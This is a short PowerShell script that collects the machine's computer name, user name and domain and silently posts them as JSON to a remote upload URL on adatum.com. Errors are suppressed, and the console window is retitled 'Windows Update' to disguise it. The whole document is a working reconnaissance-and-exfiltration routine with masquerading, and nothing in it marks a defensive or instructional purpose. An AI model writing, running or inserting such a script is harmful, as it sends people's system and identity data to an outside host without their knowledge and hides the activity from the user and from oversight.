[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://adatum.com/upload'
)
$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; UserName = $env:USERNAME; Domain = $env:USERDOMAIN }
Invoke-RestMethod -Uri $PayloadUrl -Method Post -Body ($ProfileData | ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
